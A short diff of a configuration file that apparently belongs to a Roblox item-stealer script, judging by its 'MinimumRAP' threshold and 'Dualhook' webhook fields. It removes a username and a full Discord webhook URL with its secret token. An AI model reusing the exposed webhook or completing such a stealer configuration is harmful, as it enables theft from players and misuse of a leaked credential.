@@ -1,7 +1,7 @@
 Username = "QuadCoreDragon"
-Username2 = "1LazySly8"
-Webhook = "https://discord.com/api/webhooks/1280813997423333490/c6d3SfRoIN11tVgIFoiUSghANST-wCddCEyyn42BM4r3kDEEM3vUX6KGnkJypkSvu1De"
-MinimumRAP = 1000
+Username2 = ""
+Webhook = ""
+MinimumRAP = 10000
 
 DualhookUsername = ""
 DualhookWebhook =
